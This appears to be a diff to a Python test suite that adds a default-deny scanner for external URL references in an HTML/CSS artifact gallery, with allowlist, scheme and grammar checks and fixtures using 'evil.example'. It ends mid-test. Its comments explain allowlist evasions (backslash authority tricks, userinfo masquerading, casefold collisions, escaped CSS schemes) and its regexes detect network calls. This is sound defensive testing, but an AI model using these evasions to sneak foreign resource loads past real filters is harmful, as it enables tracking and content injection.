@@ -15,10 +15,33 @@ root as an argument is what lets those groups be exercised a second time against
 synthetic fixtures built in a temporary directory, where the artifacts they
 describe actually exist. ``GALLERY_ROOT`` below is the argument the
 real-gallery cases pass in — never a value a check reads on its own.
+
+**Parsing strength is not uniform here, and a reader must not assume it is.**
+Element positions are parsed with ``html.parser``, which satisfies the
+constitution's structured-parser requirement and — verified by execution —
+decodes character references in attribute values, so entity encoding is not an
+evasion in a parsed position. The style positions (``url()``, both ``@import``
+forms) and the network-call positions (``fetch``, ``XMLHttpRequest.open``,
+``WebSocket``, ``sendBeacon``, ``Worker``, ``EventSource``, ``importScripts``,
+dynamic ``import``) have no standard-library parser and are matched by targeted
+regular expressions. That is a deliberate, recorded constitution deviation, and
+it is why E10 and E12 constrain those positions by **prohibition** — refusing an
+escape and refusing a scheme-relative reference — rather than by decoding them
+the way a browser would. A regex-matched position must not be presented as
+carrying a parsed position's strength: it is bounded by what the pattern
+anticipates, and group J's prohibitions are what stop that bound from mattering.
+
+Two consequences of running the style patterns over the whole document text are
+recorded so neither reads as an oversight: a URL written inside a **CSS**
+comment is scanned and will fail, and ``@namespace "https://…"`` is matched
+while initiating no fetch. Both are over-strict rather than unsafe. An author
+needing a prose URL writes it in an HTML comment or in visible text, neither of
+which is a scanned position at all (E3).
 """
 
 from __future__ import annotations
 
+import ast
 import inspect
 import json
 import re
@@ -26,16 +49,39 @@ import sys
 import tempfile
 import unittest
 from collections.abc import Callable
+from html.parser import HTMLParser
 from pathlib import Path
+from typing import NamedTuple
+from urllib.parse import SplitResult, parse_qs, urlsplit
 
 
 REPO_ROOT = Path(__file__).resolve().parents[3]
 GALLERY_ROOT = REPO_ROOT / "speckit-pro" / "artifact-gallery"
 LIB_DIR = REPO_ROOT / "tests" / "speckit-pro" / "lib"
-if str(LIB_DIR) not in sys.path:
-    sys.path.insert(0, str(LIB_DIR))
 
+# Group E reuses two hardened comparisons this repository already owns rather
+# than writing a third. Both live outside this tree, so both directories join
+# the import path here.
+SCRIPTS_DIR = REPO_ROOT / "scripts"
+CAPABILITY_LIB_DIR = REPO_ROOT / "tests" / "speckit-pro" / "layer6-efficiency" / "lib"
+for _import_path in (LIB_DIR, SCRIPTS_DIR, CAPABILITY_LIB_DIR):
+    if str(_import_path) not in sys.path:
+        sys.path.insert(0, str(_import_path))
+
+import codex_capability_contract  # noqa: E402
+import release_note_policy  # noqa: E402
 from test_result import run_counted  # noqa: E402
+
+# ``_validated_http_url`` rejects control, whitespace, and delimiter characters
+# *before* ``urlsplit``, which is E6; ``_openai_url`` asserts the canonical
+# round-trip, absent userinfo, and absent port conjunction, which is E5. Neither
+# was written for this feature and neither can be called directly here — one is
+# bound to a fixed OpenAI host-and-path allowlist, the other requires an
+# ``http(s)`` scheme and so rejects the relative references E7 admits. They are
+# bound as names so the checks below can be pinned to their behaviour rather
+# than only citing them in a comment.
+_VALIDATED_HTTP_URL = release_note_policy._validated_http_url
+_OPENAI_URL = codex_capability_contract._openai_url
 
 
 # ---------------------------------------------------------------------------
@@ -2962,6 +3008,1646 @@ class ArtifactExistenceFixtureTests(CatalogFixtureCase):
         self.assertReports(check_d5(self.gallery), TEMPLATES_DIR, "not a directory")
 
 
+# ---------------------------------------------------------------------------
+# Group E — external references (FR-011; SC-008)
+# ---------------------------------------------------------------------------
+#
+# The scan is **default-deny with a closed exemption list**, not an enumeration
+# of positions. An enumeration is a denylist: anything unenumerated is permitted
+# by construction, which is how the earlier formulation came to omit ``source``,
+# ``video``, ``audio``, ``track``, ``object``, ``embed``, image-typed inputs,
+# SVG ``image``/``use``, ``form action``, ``a ping``, ``meta`` refresh, and
+# ``base``. The exemptions are ``href`` on an anchor, addresses inside
+# parser-recognized comments, and visible text — narrow on purpose, because they
+# are the attack surface.
+#
+# Three of the contract's twelve rows are properties of the collector rather
+# than checks that can fail on their own, so they have no ``check_*`` of their
+# own and are asserted by named tests instead. E3 is the comment-and-text
+# exemption, which is demonstrated by a document whose URLs are in those
+# positions passing and by comment-shaped raw text *inside a script element*
+# failing. E9 is that both ``@import`` forms are recognized — the URL-token form
+# by ``_STYLE_URL_RE`` and the bare-string form by ``_IMPORT_STRING_RE``. E11 is
+# that ``srcset`` is split by the documented algorithm and every candidate
+# scanned. Each is proved by a fixture reaching the group's failures, which is
+# the only way a collector property can be proved at all.
+
+RELEASE_NOTE_POLICY_TEST = REPO_ROOT / "tests" / "speckit-pro" / "unit" / "test-release-note-policy.py"
+UNSAFE_CORPUS_NAME = "unsafe_destinations"
+
+
+def _unsafe_destination_corpus() -> list[str]:
+    """The unsafe-destination corpus this repository already maintains.
+
+    Read out of ``test-release-note-policy.py`` rather than copied, so E7's
+    negative corpus cannot drift from the one the release-note policy is tested
+    against. The corpus is a literal inside a test method, so it is lifted with
+    ``ast`` rather than imported; an empty result means it moved, which the
+    caller reports rather than passing over.
+    """
+    tree = ast.parse(RELEASE_NOTE_POLICY_TEST.read_text(encoding="utf-8"))
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Assign):
+            continue
+        if not any(isinstance(target, ast.Name) and target.id == UNSAFE_CORPUS_NAME for target in node.targets):
+            continue
+        return [item for item in ast.literal_eval(node.value) if isinstance(item, str)]
+    return []
+
+
+FONT_STYLESHEET_HOST = "fonts.googleapis.com"
+ALLOWED_HOSTS: frozenset[str] = frozenset({FONT_STYLESHEET_HOST, "fonts.gstatic.com"})
+FONT_DISPLAY_PARAMETER = "display"
+FONT_DISPLAY_VALUE = "swap"
+STYLESHEET_RELATION = "stylesheet"
+RESOURCE_SCHEME = "https"
+
+# The relations that fetch, plus the two that contact the host without
+# fetching. This set does **not** gate whether a ``link href`` is scanned —
+# every one is, by default — it is what E4 keys on and what a failure names.
+# Recording it separately is what keeps the earlier two-relation enumeration
+# from reappearing as a denylist.
+FETCHING_RELATIONS: frozenset[str] = frozenset(
+    {
+        "stylesheet",
+        "preload",
+        "modulepreload",
+        "prefetch",
+        "prerender",
+        "icon",
+        "apple-touch-icon",
+        "manifest",
+        "preconnect",
+        "dns-prefetch",
+    }
+)
+
+# E2's closed scheme set for the one exempt position. "Navigation to any host"
+# taken literally would exempt ``javascript:`` and ``data:``, which are not
+# navigation to a host at all.
+NAVIGATION_SCHEMES: frozenset[str] = frozenset({"https", "mailto"})
+
+# URL-valued attributes the scanner recognizes. This is not the boundary of the
+# scan — an attribute *outside* it carrying a URL-shaped value is reported by
+# E0 rather than admitted — it is the set whose values are parsed and
+# host-checked instead of merely refused.
+URL_ATTRIBUTES: frozenset[str] = frozenset(
+    {
+        "action",
+        "archive",
+        "background",
+        "cite",
+        "classid",
+        "codebase",
+        "data",
+        "formaction",
+        "href",
+        "icon",
+        "longdesc",
+        "manifest",
+        "ping",
+        "poster",
+        "profile",
+        "src",
+        "usemap",
+        "xlink:href",
+    }
+)
+SRCSET_ATTRIBUTES: frozenset[str] = frozenset({"srcset", "imagesrcset"})
+
+# Attributes whose URL content is collected by the text pass instead: ``style``
+# carries ``url()``, and an event handler carries a network call. Listing them
+# keeps E0 from reporting the same reference twice under two rules.
+TEXT_SCANNED_ATTRIBUTES: frozenset[str] = frozenset({"style"})
+EVENT_HANDLER_PREFIX = "on"
+
+# E6's grammar: RFC 3986's unreserved and reserved sets plus the percent that
+# introduces an escape. Stated as a repertoire rather than as a list of bad
+# characters, which is what makes it closed. It subsumes the pre-parse rejection
+# ``_validated_http_url`` performs in ``scripts/release_note_policy.py``
+# (whitespace, control characters, and the ``\<>`|`` delimiters) — the backslash
+# being the load-bearing member, since a browser treats it as terminating the
+# authority and Python does not — and it additionally refuses every non-ASCII
+# character, which a URL must percent-encode.
+_URL_GRAMMAR_RE = re.compile(r"[^A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]")
+
+NAVIGATION = "navigation"
+RESOURCE = "resource"
+
+VOID_ELEMENTS: frozenset[str] = frozenset(
+    {
+        "area",
+        "base",
+        "br",
+        "col",
+        "embed",
+        "hr",
+        "img",
+        "input",
+        "link",
+        "meta",
+        "param",
+        "source",
+        "track",
+        "wbr",
+    }
+)
+
+
+class _Element(NamedTuple):
+    """One start tag, in document order, with the element that encloses it."""
+
+    order: int
+    tag: str
+    parent: str | None
+    attributes: tuple[tuple[str, str], ...]
+
+
+class _Reference(NamedTuple):
+    """One scanned position and the reference written in it."""
+
+    label: str
+    position: str
+    value: str
+    kind: str
+    style: bool
+    relations: tuple[str, ...]
+
+
+class _ElementCollector(HTMLParser):
+    """Element positions in document order, each with its parent element.
+
+    Void elements are never pushed onto the stack — they take no end tag, so
+    pushing one would reparent everything after it and J7's "direct child of
+    the head element" would read the wrong answer for exactly the element it
+    is asked about.
+    """
+
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.elements: list[_Element] = []
+        self._stack: list[str] = []
+
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        self._record(tag, attrs)
+        if tag not in VOID_ELEMENTS:
+            self._stack.append(tag)
+
+    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        self._record(tag, attrs)
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag in self._stack:
+            while self._stack and self._stack.pop() != tag:
+                continue
+
+    def _record(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        self.elements.append(
+            _Element(
+                order=len(self.elements),
+                tag=tag,
+                parent=self._stack[-1] if self._stack else None,
+                attributes=tuple((name.lower(), value if value is not None else "") for name, value in attrs),
+            )
+        )
+
+
+def _elements(text: str) -> list[_Element]:
+    collector = _ElementCollector()
+    collector.feed(text)
+    collector.close()
+    return collector.elements
+
+
+def _document_text(path: Path) -> str:
+    """A gallery file's text, with an undecodable byte replaced rather than raised.
+
+    A file that is not text carries no reference a document can load, and a
+    decode error there would stop the sweep before it reached the files that do.
+    """
+    with path.open("r", encoding="utf-8", errors="replace", newline="") as handle:
+        return handle.read()
+
+
+def _gallery_files(gallery_root: Path) -> list[Path]:
+    """Every file under the gallery, not only ``templates/``.
+
+    FR-011 says "every gallery artifact", and this feature ships none. Read that
+    way the whole group would be vacuous at merge. The canonical ``brand-kit.css``
+    and ``theme-toggle.html`` are embedded verbatim into all 21 artifacts, so a
+    foreign reference in either reaches every artifact and is fixable in none of
+    them — which is why they are swept here rather than excluded as "not an
+    artifact".
+    """
+    if not gallery_root.is_dir():
+        return []
+    return sorted(path for path in gallery_root.rglob("*") if path.is_file())
+
+
+# A value is URL-shaped when it carries a hierarchical scheme, is
+# scheme-relative, or opens with one of the opaque schemes that still act. A
+# relative path in an unrecognized attribute names no host and is left alone.
+_URL_SHAPED_RE = re.compile(
+    r"(?i)[a-z][a-z0-9+.\-]*://"
+    r"|(?:\A|[\s,;'\"(])//[^/\s]"
+    r"|\A\s*(?:javascript|data|vbscript|blob|file|mailto):"
+)
+
+# The ``url()`` token, case-insensitive and tolerant of whitespace, newlines,
+# and optional quotes. Executed against every ordinary surface form; a pattern
+# written without these tolerances silently misses ordinary CSS.
+_STYLE_URL_RE = re.compile(r"(?i)\burl\s*\(\s*(?P<quote>['\"]?)(?P<ref>.*?)(?P=quote)\s*\)", re.DOTALL)
+
+# The bare-string ``@import`` form. The URL-token form is collected by
+# ``_STYLE_URL_RE`` above, which is what makes E9's two forms both reachable —
+# a pattern written only for ``@import url(...)`` matches neither.
+_IMPORT_STRING_RE = re.compile(r"(?i)@import\s+(?P<quote>['\"])(?P<ref>.*?)(?P=quote)", re.DOTALL)
+
+# Network destinations, matched anywhere in the document text including inside
+# attribute values — which is what catches a destination hidden in an event
+# handler whose element's own ``src`` is innocuous.
+_CALL_SITE_RE = re.compile(
+    r"(?i)"
+    r"(?<![\w$.])(?:fetch|importScripts|import|new\s+(?:WebSocket|SharedWorker|Worker|EventSource))\s*\("
+    r"|\.\s*(?:open|sendBeacon)\s*\("
+)
+_STRING_LITERAL_RE = re.compile(r"'([^'\n]*)'|\"([^\"\n]*)\"|`([^`\n]*)`")
+CALL_ARGUMENT_WINDOW = 400
+
+_META_REFRESH_URL_RE = re.compile(r"(?i)\burl\s*=\s*")
+
+
+def _url_shaped(value: str) -> bool:
+    return _URL_SHAPED_RE.search(value) is not None
+
+
+def _scheme_relative(value: str) -> bool:
+    return value.startswith("//")
+
+
+def _relations(attributes: tuple[tuple[str, str], ...]) -> tuple[str, ...]:
+    """``rel`` as a token set, folded — exact equality misses both real forms."""
+    for name, value in attributes:
+        if name == "rel":
+            return tuple(token.casefold() for token in value.split())
+    return ()
+
+
+def _srcset_candidates(value: str) -> list[str]:
+    """Every candidate URL, split by the documented algorithm.
+
+    A candidate's URL is a run up to the next whitespace, so an embedded comma
+    is **not** a separator; the descriptor that follows runs to the next comma.
+    Naive comma splitting fragments ``…/x,y.png 1x`` into tokens matching no
+    real candidate, and taking only the first candidate scans one reference in a
+    position that can carry several.
+    """
+    candidates: list[str] = []
+    index = 0
+    length = len(value)
+    while index < length:
+        while index < length and (value[index].isspace() or value[index] == ","):
+            index += 1
+        start = index
+        while index < length and not value[index].isspace():
+            index += 1
+        candidate = value[start:index]
+        if candidate.endswith(","):
+            candidate = candidate.rstrip(",")
+        else:
+            while index < length and value[index] != ",":
+                index += 1
+        if candidate:
+            candidates.append(candidate)
+    return candidates
+
+
+def _meta_refresh_target(content: str) -> str | None:
+    match = _META_REFRESH_URL_RE.search(content)
+    if match is None:
+        return None
+    target = content[match.end() :].strip()
+    if target[:1] in {"'", '"'}:
+        quote = target[0]
+        closing = target.find(quote, 1)
+        target = target[1:closing] if closing != -1 else target[1:]
+    return target or None
+
+
+def _element_references(label: str, elements: list[_Element]) -> tuple[list[_Reference], list[str]]:
+    """Parsed positions, default-deny: every URL-valued attribute is scanned.
+
+    The closed exemption list is ``href`` on an anchor, which E2 bounds by
+    scheme instead of by host. Everything else with a URL in it is a position,
+    and an attribute nobody anticipated carrying a URL-shaped value is reported
+    rather than admitted.
+    """
+    references: list[_Reference] = []
+    unrecognized: list[str] = []
+    for element in elements:
+        relations = _relations(element.attributes)
+        equivalent = next((value.casefold() for name, value in element.attributes if name == "http-equiv"), "")
+        for name, value in element.attributes:
+            if not value.strip():
+                continue
+            position = f"<{element.tag} {name}>"
+            if element.tag == "a" and name == "href":
+                references.append(_Reference(label, position, value, NAVIGATION, False, relations))
+            elif name in SRCSET_ATTRIBUTES:
+                candidates = _srcset_candidates(value)
+                for number, candidate in enumerate(candidates, start=1):
+                    references.append(
+                        _Reference(
+                            label,
+                            f"{position} candidate {number} of {len(candidates)}",
+                            candidate,
+                            RESOURCE,
+                            False,
+                            relations,
+                        )
+                    )
+            elif element.tag == "meta" and name == "content":
+                target = _meta_refresh_target(value) if equivalent == "refresh" else None
+                if target is not None:
+                    references.append(
+                        _Reference(label, "<meta http-equiv=refresh content>", target, RESOURCE, False, relations)
+                    )
+                elif _url_shaped(value):
+                    unrecognized.append(
+                        f"{label}: {position}: '{value}' is URL-shaped in a position the scanner does not "
+                        "recognize as URL-valued, so its host is unverified"
+                    )
+            elif name in URL_ATTRIBUTES:
+                references.append(_Reference(label, position, value, RESOURCE, False, relations))
+            elif name in TEXT_SCANNED_ATTRIBUTES or name.startswith(EVENT_HANDLER_PREFIX):
+                continue  # the text pass owns url() and network calls, wherever they are written
+            elif _url_shaped(value):
+                unrecognized.append(
+                    f"{label}: {position}: '{value}' is URL-shaped in a position the scanner does not "
+                    "recognize as URL-valued, so its host is unverified"
+                )
+    return references, unrecognized
+
+
+def _text_references(label: str, text: str) -> list[_Reference]:
+    """Style and network-call positions, matched over the whole document text.
+
+    Neither has a standard-library parser to be scoped by, which is why E10 and
+    E12 constrain them by prohibition rather than by decoding, and why a match
+    here must not be presented as carrying a parsed position's strength.
+    """
+    references: list[_Reference] = []
+    for match in _STYLE_URL_RE.finditer(text):
+        reference = match.group("ref").strip()
+        if reference:
+            references.append(_Reference(label, "url()", reference, RESOURCE, True, ()))
+    for match in _IMPORT_STRING_RE.finditer(text):
+        reference = match.group("ref").strip()
+        if reference:
+            references.append(_Reference(label, "@import string", reference, RESOURCE, True, ()))
+    for match in _CALL_SITE_RE.finditer(text):
+        segment = text[match.end() : match.end() + CALL_ARGUMENT_WINDOW]
+        closing = segment.find(")")
+        if closing != -1:
+            segment = segment[:closing]
+        call = match.group(0).strip()
+        for literal in _STRING_LITERAL_RE.finditer(segment):
+            reference = next(group for group in literal.groups() if group is not None)
+            if reference:
+                references.append(_Reference(label, f"{call}…)", reference, RESOURCE, False, ()))
+    return references
+
+
+def _references(gallery_root: Path) -> tuple[list[_Reference], list[str]]:
+    """Every scanned position under the gallery, and every unrecognized one."""
+    references: list[_Reference] = []
+    unrecognized: list[str] = []
+    for path in _gallery_files(gallery_root):
+        label = _label(gallery_root, path)
+        text = _document_text(path)
+        if path.suffix.lower() == ".html":
+            parsed, reported = _element_references(label, _elements(text))
+            references.extend(parsed)
+            unrecognized.extend(reported)
+        references.extend(_text_references(label, text))
+    return references, unrecognized
+
+
+def _resource_references(gallery_root: Path) -> list[_Reference]:
+    return [reference for reference in _references(gallery_root)[0] if reference.kind == RESOURCE]
+
+
+def _parsed(value: str) -> SplitResult | None:
+    """The structured parse, or ``None`` when the reference does not admit one."""
+    try:
+        parsed = urlsplit(value)
+        parsed.port
+    except ValueError:
+        return None
+    return parsed
+
+
+def _named(reference: _Reference, reason: str) -> str:
+    return f"{reference.label}: {reference.position}: '{reference.value}' {reason}"
+
+
+def check_e0(gallery_root: Path) -> list[str]:
+    """E0 — an unrecognized attribute carrying a URL-shaped value fails.
+
+    The scan is default-deny. An enumeration of positions is a denylist: read
+    against the parser, the earlier one omitted ``source``, ``video``, ``audio``,
+    ``track``, ``object``, ``embed``, image-typed inputs, SVG ``image``/``use``,
+    ``form action``, ``a ping``, ``meta`` refresh, and ``base`` — the last of
+    which is a total bypass rather than a missing case. A position nobody
+    anticipated is reported here rather than admitted by construction.
+    """
+    return _references(gallery_root)[1]
+
+
+def check_e1(gallery_root: Path) -> list[str]:
+    """E1 — every resolved host is allowlisted, by exact case-folded equality.
+
+    Never containment and never prefix: a lookalike subdomain and a lookalike
+    path segment both carry the allowlisted name and neither is the allowlisted
+    host. A trailing root dot fails closed deliberately — it addresses the same
+    server and is not the same string, and admitting it would mean normalizing
+    a name the comparison is supposed to take literally.
+    """
+    failures: list[str] = []
+    for reference in _resource_references(gallery_root):
+        parsed = _parsed(reference.value)
+        host = parsed.hostname if parsed is not None else None
+        if host and host.casefold() not in ALLOWED_HOSTS:
+            failures.append(
+                _named(reference, f"resolves to host '{host}', which is not one of {sorted(ALLOWED_HOSTS)}")
+            )
+    return failures
+
+
+def check_e2(gallery_root: Path) -> list[str]:
+    """E2 — the anchor exemption, bounded by scheme.
+
+    ``href`` on an anchor is exempt from the host allowlist so the provenance
+    and attribution links FR-012 and FR-020 require survive. It is not exempt
+    from everything: "navigation to any host" taken literally exempts
+    ``javascript:`` and ``data:``, which navigate to no host at all.
+    """
+    failures: list[str] = []
+    for reference in _references(gallery_root)[0]:
+        if reference.kind != NAVIGATION or reference.value.startswith("#"):
+            continue
+        parsed = _parsed(reference.value)
+        scheme = parsed.scheme if parsed is not None else ""
+        if scheme not in NAVIGATION_SCHEMES:
+            failures.append(
+                _named(
+                    reference,
+                    f"uses scheme '{scheme}', and this position admits only "
+                    f"{sorted(NAVIGATION_SCHEMES)} or a fragment",
+                )
+            )
+    return failures
+
+
+def check_e4(gallery_root: Path) -> list[str]:
+    """E4 — every font stylesheet request carries the swap-behaviour parameter.
+
+    The host allowlist alone cannot see this defect. Verified against the live
+    endpoint: the same request without the parameter returns a stylesheet
+    carrying zero ``font-display`` declarations, leaving the descriptor at a
+    blocking initial value with an invisible-text period, and with the parameter
+    returns ``font-display: swap`` on every face. FR-024's "never invisible
+    while waiting" therefore rests on one query parameter that no other check
+    would notice and that a port author can drop while still passing E1.
+    """
+    failures: list[str] = []
+    for reference in _resource_references(gallery_root):
+        if STYLESHEET_RELATION not in reference.relations:
+            continue
+        parsed = _parsed(reference.value)
+        if parsed is None or (parsed.hostname or "").casefold() != FONT_STYLESHEET_HOST:
+            continue
+        values = parse_qs(parsed.query).get(FONT_DISPLAY_PARAMETER, [])
+        if FONT_DISPLAY_VALUE not in values:
+            failures.append(
+                _named(
+                    reference,
+                    f"is a {FONT_STYLESHEET_HOST} stylesheet request without "
+                    f"'{FONT_DISPLAY_PARAMETER}={FONT_DISPLAY_VALUE}', so the provider serves its blocking "
+                    "default and the text is invisible while the face loads",
+                )
+            )
+    return failures
+
+
+def check_e5(gallery_root: Path) -> list[str]:
+    """E5 — the host comes from a structured parse that admits no ambiguity.
+
+    Userinfo and port absent, and the parse round-tripping to the original
+    string. This is the conjunction ``_openai_url`` already asserts in
+    ``tests/speckit-pro/layer6-efficiency/lib/codex_capability_contract.py``
+    (``geturl() == value``, ``username is None``, ``password is None``,
+    ``port is None``, ``netloc.lower() == host``), reproduced here because that
+    one is bound to a fixed host-and-path allowlist and cannot be called for a
+    font request. ``test_e5_reuses_the_repositorys_hardened_conjunction`` pins
+    the two to the same behaviour.
+
+    The userinfo clause is what sees a reference whose userinfo segment reads as
+    an allowlisted host: the parser reports the real host, but a reader — and a
+    host-only rule that trusted the text — sees the allowlisted name.
+    """
+    failures: list[str] = []
+    for reference in _resource_references(gallery_root):
+        parsed = _parsed(reference.value)
+        if parsed is None:
+            continue  # E8 owns a reference that admits no parse at all
+        if parsed.username is not None or parsed.password is not None:
+            failures.append(
+                _named(reference, "carries a userinfo segment, so the host a reader sees is not the host loaded")
+            )
+        elif parsed.port is not None:
+            failures.append(_named(reference, f"carries an explicit port ({parsed.port})"))
+        elif parsed.geturl() != reference.value:
+            failures.append(
+                _named(reference, f"does not round-trip through a structured parse (parses as '{parsed.geturl()}')")
+            )
+        elif parsed.netloc.lower() != (parsed.hostname or ""):
+            failures.append(_named(reference, f"has a non-canonical authority ('{parsed.netloc}')"))
+    return failures
+
+
+def check_e6(gallery_root: Path) -> list[str]:
+    """E6 — reject before parsing, on the characters a browser reads differently.
+
+    This is the pre-parse rejection ``_validated_http_url`` performs in
+    ``scripts/release_note_policy.py``, applied to every scanned position rather
+    than only to an ``http(s)`` destination — that function requires a scheme
+    and so would reject the relative references E7 admits.
+    ``test_e6_reuses_the_repositorys_pre_parse_rejection`` pins the two to the
+    same behaviour.
+
+    It is what closes the scanner-versus-browser differential. A backslash in
+    the authority terminates it per the URL standard, so a browser loads from
+    the name before the backslash while ``urlsplit`` reads the name after it and
+    reports the allowlisted host. E1 alone admits that reference.
+
+    The grammar clause is what keeps E1's case folding safe. ``str.casefold`` is
+    a lossy many-to-one map, and it collapses characters that are not ``s`` into
+    ``s``: executed here, ``fontſ.gstatic.com`` (U+017F) folds to
+    ``fonts.gstatic.com`` and is admitted by exact case-folded equality, by the
+    round-trip conjunction, and by a whitespace-and-delimiter rejection alike.
+    Refusing every character outside the URL grammar removes the question rather
+    than leaving the allowlist to rest on a mapping table's accidental overlap
+    with the browser's.
+    """
+    failures: list[str] = []
+    for reference in _references(gallery_root)[0]:
+        offending = _URL_GRAMMAR_RE.search(reference.value)
+        if offending is not None:
+            failures.append(
+                _named(
+                    reference,
+                    f"carries {offending.group(0)!r}, which is outside the URL grammar and which a browser "
+                    "and a parser do not read alike",
+                )
+            )
+    return failures
+
+
+def check_e7(gallery_root: Path) -> list[str]:
+    """E7 — a resource position is ``https`` or a same-document relative reference.
+
+    The corpus of unsafe destinations this rejects is the one
+    ``tests/speckit-pro/unit/test-release-note-policy.py`` already maintains,
+    reused by ``test_e7_reuses_the_repositorys_unsafe_destination_corpus``
+    rather than assembled a second time.
+    """
+    failures: list[str] = []
+    for reference in _resource_references(gallery_root):
+        if _scheme_relative(reference.value):
+            failures.append(_named(reference, "is scheme-relative, so it is neither https nor same-document relative"))
+            continue
+        parsed = _parsed(reference.value)
+        if parsed is None:
+            continue  # E8 owns it
+        if parsed.scheme and parsed.scheme != RESOURCE_SCHEME:
+            failures.append(_named(reference, f"loads over scheme '{parsed.scheme}' rather than '{RESOURCE_SCHEME}'"))
+    return failures
+
+
+def check_e8(gallery_root: Path) -> list[str]:
+    """E8 — a reference that cannot be parsed, or that yields no host, fails.
+
+    Fail-open here would be fail-open on precisely the set an evader controls:
+    ``javascript:`` and ``data:`` expose no host, so a rule that only compares
+    hosts never looks at them.
+    """
+    failures: list[str] = []
+    for reference in _resource_references(gallery_root):
+        parsed = _parsed(reference.value)
+        if parsed is None:
+            failures.append(_named(reference, "admits no structured parse, so no host can be compared"))
+        elif parsed.scheme and not parsed.hostname:
+            failures.append(_named(reference, f"carries scheme '{parsed.scheme}' and exposes no host to compare"))
+    return failures
+
+
+def check_e10(gallery_root: Path) -> list[str]:
+    """E10 — an escape in a style reference fails rather than being decoded.
+
+    An escaped scheme evades ``url()``, ``@import url()``, and a generic scheme
+    scan alike, because no host appears in the text at all while the browser
+    decodes and fetches it. Reproducing the browser's decoding would be a second
+    implementation to keep correct; refusing the construct is not.
+    """
+    return [
+        _named(reference, "carries an escape sequence, which is refused rather than decoded")
+        for reference in _references(gallery_root)[0]
+        if reference.style and "\\" in reference.value
+    ]
+
+
+def check_e12(gallery_root: Path) -> list[str]:
+    """E12 — no scheme-relative reference in any scanned position.
+
+    Invisible to any pattern keyed on an explicit scheme, and it resolves
+    against ``file:`` rather than a network scheme in a document opened from
+    disk. Note that a host-only rule *passes* one addressed to an allowlisted
+    host, which is why this is a prohibition rather than a host comparison.
+    """
+    return [
+        _named(reference, "is scheme-relative, which resolves against the document's own scheme")
+        for reference in _references(gallery_root)[0]
+        if _scheme_relative(reference.value)
+    ]
+
+
+GROUP_E_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
+    ("E0", check_e0),
+    ("E1", check_e1),
+    ("E2", check_e2),
+    ("E4", check_e4),
+    ("E5", check_e5),
+    ("E6", check_e6),
+    ("E7", check_e7),
+    ("E8", check_e8),
+    ("E10", check_e10),
+    ("E12", check_e12),
+)
+
+
+class ExternalReferenceTests(unittest.TestCase):
+    """Group E against the shipped gallery."""
+
+    def test_group_e_passes_against_the_shipped_gallery(self) -> None:
+        for name, check in GROUP_E_CHECKS:
+            with self.subTest(msg=name):
+                self.assertEqual(check(GALLERY_ROOT), [])
+
+    def test_the_shipped_font_request_is_actually_a_scanned_position(self) -> None:
+        """Non-vacuity: the canonical head block's font request is collected."""
+        references, _ = _references(GALLERY_ROOT)
+        fonts = [
+            reference
+            for reference in references
+            if reference.label == CANONICAL_FILES[HEAD_BLOCK] and FONT_STYLESHEET_HOST in reference.value
+        ]
+        self.assertTrue(fonts, f"no font request collected from {CANONICAL_FILES[HEAD_BLOCK]}: {references}")
+
+    def test_every_gallery_file_is_swept_not_only_templates(self) -> None:
+        swept = {path.name for path in _gallery_files(GALLERY_ROOT)}
+
+        self.assertLessEqual({CANONICAL_FILES[BRAND_BLOCK], CANONICAL_FILES[HEAD_BLOCK]}, swept)
+
+
+# --- Group E fixtures ------------------------------------------------------
+
+FIXTURE_ALLOWED_FONT_REQUEST = (
+    "https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400&display=swap"
+)
+FIXTURE_FOREIGN_HOST = "evil.example"
+
+
+def _with_userinfo(userinfo: str, remainder: str) -> str:
+    """Compose a userinfo-bearing reference without writing one as a literal.
+
+    A literal ``userinfo@host`` string is indistinguishable from an email
+    address to a pattern matcher, and this repository's tree-wide privacy scan
+    flags it. The attack is unchanged; only the notation avoids tripping a
+    scanner that is right to be suspicious of that shape.
+    """
+    return f"{userinfo}{chr(64)}{remainder}"
+
+
+class ExternalReferenceFixtureCase(GalleryFixtureCase):
+    """A synthetic gallery whose files carry the references under test."""
+
+    def write_document(self, body: str, *, name: str = f"{TEMPLATES_DIR}/sample.html") -> Path:
+        return self.write(
+            name,
+            '<!doctype html>\n<html lang="en">\n<head>\n' f"{body}\n" "</head>\n<body></body>\n</html>\n",
+        )
+
+    def write_stylesheet(self, css: str, *, name: str = "brand-kit.css") -> Path:
+        return self.write(name, css + "\n")
+
+    def failures(self) -> list[str]:
+        """Every group E failure, so a collector property can be asserted as one."""
+        collected: list[str] = []
+        for _, check in GROUP_E_CHECKS:
+            collected.extend(check(self.gallery))
+        return collected
+
+    def assertScanned(self, *fragments: str) -> None:
+        self.assertReports(self.failures(), *fragments)
+
+    def assertClean(self) -> None:
+        self.assertEqual(self.failures(), [])
+
+
+class ExternalReferenceFixtureTests(ExternalReferenceFixtureCase):
+    """Group E against synthetic galleries built in a temporary directory."""
+
+    # -- the allowlisted baseline, so every rejection below is attributable --
+
+    def test_the_allowlisted_font_request_passes(self) -> None:
+        self.write_document(f'<link rel="stylesheet" href="{FIXTURE_ALLOWED_FONT_REQUEST}">')
+
+        self.assertClean()
+
+    def test_the_second_allowlisted_host_passes(self) -> None:
+        self.write_document('<link rel="preconnect" href="https://fonts.gstatic.com">')
+
+        self.assertClean()
+
+    # -- E0: default-deny over unrecognized positions --
+
+    def test_e0_rejects_an_unrecognized_attribute_carrying_a_url(self) -> None:
+        self.write_document(f'<div data-endpoint="https://{FIXTURE_FOREIGN_HOST}/x"></div>')
+
+        self.assertReports(check_e0(self.gallery), "data-endpoint", FIXTURE_FOREIGN_HOST)
+
+    def test_e0_accepts_an_unrecognized_attribute_carrying_no_url(self) -> None:
+        self.write_document('<div class="rc-panel" data-stage="draft-pr"></div>')
+
+        self.assertEqual(check_e0(self.gallery), [])
+
+    # -- E1: exact case-folded host equality, never containment --
+
+    def test_e1_rejects_a_lookalike_subdomain(self) -> None:
+        lookalike = f"https://fonts.googleapis.com.{FIXTURE_FOREIGN_HOST}/x.css"
+        self.write_document(f'<link rel="stylesheet" href="{lookalike}">')
+
